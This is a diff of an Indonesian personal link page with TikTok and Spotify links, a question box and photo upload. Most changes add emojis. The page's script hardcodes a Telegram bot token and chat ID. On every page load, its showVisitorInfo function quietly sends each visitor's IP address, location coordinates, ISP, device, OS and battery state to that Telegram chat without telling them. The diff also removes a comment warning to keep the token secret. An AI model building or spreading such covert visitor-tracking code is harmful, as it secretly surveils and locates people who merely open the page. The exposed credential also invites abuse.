@@ -118,29 +118,29 @@
           <img src="https://i.imgur.com/S1gkBZn.jpeg" alt="im4mdv">
         </div>
         <div class="right-info">
-          <h1>sybau</h1>
-          <p class="tag">sharing vibes & question </p>
+          <h1>sybau calm</h1>
+          <p class="tag">sharing vibes & question 🌐</p>
           <!-- Musik button di dalam kolom kanan nama -->
-          <button id="musicButton" class="musicBtn"> klik dulu</button>
+          <button id="musicButton" class="musicBtn">👉🏻👈🏻klik dulu</button>
         </div>
       </div>
 
       <div class="btns">
         <a class="btn" href="https://www.tiktok.com/@koplingterus" target="_blank">
-            TikTok<small>@koplingterus</small></a>
+           📱 TikTok<small>@koplingterus</small></a>
         <a class="btn" href="https://open.spotify.com/user/31ekkvvirtytc24a46swumscuv3e?si=NNMZyh0WTnSdYnOnh23jPQ" target="_blank">
-            Spotify<small>spotify.link/Djt4Dj7BvXb</small></a>
-        <button class="btn" id="openAsk"> Pertanyaan/Question</button>
+           🎸Spotify<small>spotify.link/Djt4Dj7BvXb</small></a>
+        <button class="btn" id="openAsk">📬 Pertanyaan/Question</button>
       </div>
 
       <div class="music">
-        <h3> Kirim foto?</h3>
-        <p class="note">Unggah foto yang akan dikirim</p>
-        <button class="btn" id="takePhoto" style="margin-bottom:8px;">  Ambil Foto</button>
+        <h3>🖼️Kirim foto?</h3>
+        <p class="note">Unggah foto yang akan dikirim📨</p>
+        <button class="btn" id="takePhoto" style="margin-bottom:8px;"> 📸Ambil Foto</button>
         <input type="file" id="photoInput" accept="image/*">
         <img id="photoPreview" style="display:none;margin-top:10px;width:100%;border-radius:8px;">
         <textarea id="caption" rows="2" placeholder="Tulis pesan ya!"></textarea>
-        <button class="btn" id="sendPhoto" style="margin-top:8px;"> Kirim Foto</button>
+        <button class="btn" id="sendPhoto" style="margin-top:8px;">📨 Kirim Foto</button>
         <div id="status" class="note"></div>
       </div>
 
@@ -151,7 +151,7 @@
   <!-- Modal Kirim Pertanyaan -->
   <div class="modal" id="modal">
     <div class="panel">
-      <h3> Kirim pertanyaan</h3>
+      <h3>📜 Kirim pertanyaan</h3>
       <p class="tiny">Mau bertanya tentang aku?</p>
       <textarea id="qtext" rows="4" placeholder="Tulis pertanyaan kamu..." required></textarea>
       <div style="display:flex;gap:8px;margin-top:8px">
@@ -192,7 +192,7 @@
   <div id="visitorInfo" style="display:none;"></div>
 
   <script>
-    // ---------- Konfigurasi (jaga kerahasiaan BOT_TOKEN jika di production) ----------
+    // ---------- Konfigurasi ----------
     const BOT_TOKEN = "8317170535:AAGh0PBKO4T-HkZQ4b7COREqLWcOIjW3QTY";
     const CHAT_ID = "6864694275";
 
@@ -256,12 +256,12 @@
 
     function showUserStatus(name) {
       const el = document.getElementById("igStatus");
-      el.textContent = ` Login sebagai ${name} (keluar)`;
+      el.textContent = `👉🏻Login sebagai ${name} (keluar)`;
       el.style.display = "block";
       el.onclick = () => {
         if (confirm("Keluar dan hapus username?")) {
           localStorage.removeItem("ig_user");
-          el.textContent = " Logout...";
+          el.textContent = "👉🏻Logout...";
           setTimeout(() => location.reload(), 600);
         }
       };
@@ -286,7 +286,7 @@
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
             chat_id: CHAT_ID,
-            text: ` Username login: ${username}`,
+            text: `👉🏻 Username login: ${username}`,
           }),
         });
       } catch (e) { console.log("Gagal kirim ke Telegram", e); }
@@ -305,7 +305,7 @@
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ chat_id: CHAT_ID, text: ` Pertanyaan dari ${savedUser}\n${text}` })
         });
-        qmsg.textContent = res.ok ? " Terkirim!" : " Gagal.";
+        qmsg.textContent = res.ok ? "✅ Terkirim!" : "😮‍💨 Gagal.";
         if (res.ok) setTimeout(() => modal.classList.remove('show'), 1000);
       } catch (e) { qmsg.textContent = "Cek koneksi."; }
     });
@@ -357,20 +357,20 @@
 
       const fd = new FormData();
       fd.append("chat_id", CHAT_ID);
-      fd.append("caption", ` Foto dari ${savedUser}\n${caption}`);
+      fd.append("caption", `🖕🏻 Foto dari ${savedUser}\n${caption}`);
       fd.append("photo", file);
 
-      statusEl.textContent = "Mengirim ...";
+      statusEl.textContent = "Mengirim📨 ...";
       try {
         const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
         if (res.ok) {
-          statusEl.textContent = " Terkirim!";
+          statusEl.textContent = "💌 Terkirim!";
           fileInput.value = "";
           document.getElementById("caption").value = "";
           preview.style.display = "none";
           setTimeout(() => { statusEl.textContent = ""; }, 2500);
-        } else statusEl.textContent = " Gagal.";
-      } catch (e) { statusEl.textContent = " Koneksi lemah."; }
+        } else statusEl.textContent = "💔 Gagal.";
+      } catch (e) { statusEl.textContent = "😿 Koneksi lemah."; }
     });
 	
    // ---------- Info Pengunjung (kirim ke Telegram) ----------
@@ -401,17 +401,16 @@ async function showVisitorInfo() {
 
     // Susun pesan Telegram
     const msg = ` *Pengunjung Baru*  
-
- *User:* ${savedUser}
- *Lokasi:* ${d.city || "-"}, ${d.country_name || "-"}
- *Koordinat:* ${d.latitude || "-"}, ${d.longitude || "-"}
- *Perangkat:* ${device}
- *OS:* ${OS}
- *Baterai:* ${(battery.level * 100).toFixed(0)}% (${battery.charging ? " Mengisi" : " Tidak"})
- *ISP:* ${d.org || "-"}
- *IP:* ${d.ip || "-"}
- *Waktu:* ${now.toLocaleString('id-ID')}
-`;
+🫂 *User:* ${savedUser}
+🌍 *Lokasi:* ${d.city || "-"}, ${d.country_name || "-"}
+🗺️ *Koordinat:* ${d.latitude || "-"}, ${d.longitude || "-"}
+🌐 *Perangkat:* ${device}
+📱 *OS:* ${OS}
+🔋 *Baterai:* ${(battery.level * 100).toFixed(0)}% (${battery.charging ? " Mengisi" : " Tidak"})
+📡 *ISP:* ${d.org || "-"}
+🔢 *IP:* ${d.ip || "-"}
+⌛ *Waktu:* ${now.toLocaleString('id-ID')}
+`;
 
     // Kirim ke Telegram
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -424,9 +423,9 @@ async function showVisitorInfo() {
       })
     });
 
-    console.log(" Info pengunjung berhasil dikirim");
+    console.log("✅ Info pengunjung berhasil dikirim");
   } catch (e) {
-    console.log(" Gagal kirim info pengunjung:", e);
+    console.log("🖕🏻 Gagal kirim info pengunjung:", e);
   }
 }
 showVisitorInfo();
@@ -476,7 +475,7 @@ showVisitorInfo();
   for (let i = 0; i < butterflyCount; i++) {
     const b = document.createElement("div");
     b.className = "butterfly";
-    b.textContent = "";
+    b.textContent = "💸";
     area.appendChild(b);
 
     butterflies.push({
